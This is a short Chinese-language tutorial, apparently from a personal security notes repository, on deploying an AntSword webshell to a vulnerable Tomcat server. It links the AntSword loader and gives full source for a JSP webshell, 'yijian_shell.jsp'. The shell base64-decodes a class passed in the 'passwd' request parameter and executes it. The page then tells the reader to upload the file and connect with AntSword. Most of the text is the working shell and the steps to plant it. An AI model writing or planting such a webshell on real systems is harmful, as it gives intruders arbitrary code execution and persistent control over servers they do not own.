### 1、下载蚁剑
```
https://github.com/AntSwordProject/AntSword-Loader
```
### 2、编写蚁剑shell，上传至tomcat漏洞服务器:

yijian_shell.jsp

```jsp
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>

```

### 3、将此文件，上传至tomcat漏洞服务器，在服务器上命名为yijian_shell.jsp
![image](https://github.com/498946975/Security/blob/master/images/image-20211226161120663.png)

### 4、用蚁剑shell连接tomcat服务器
![image](https://github.com/498946975/Security/blob/master/images/image-20211226165421403.png)

![image](https://github.com/498946975/Security/blob/master/images/image-20211226165536391.png)

![image](https://github.com/498946975/Security/blob/master/images/image-20211226165649654.png)


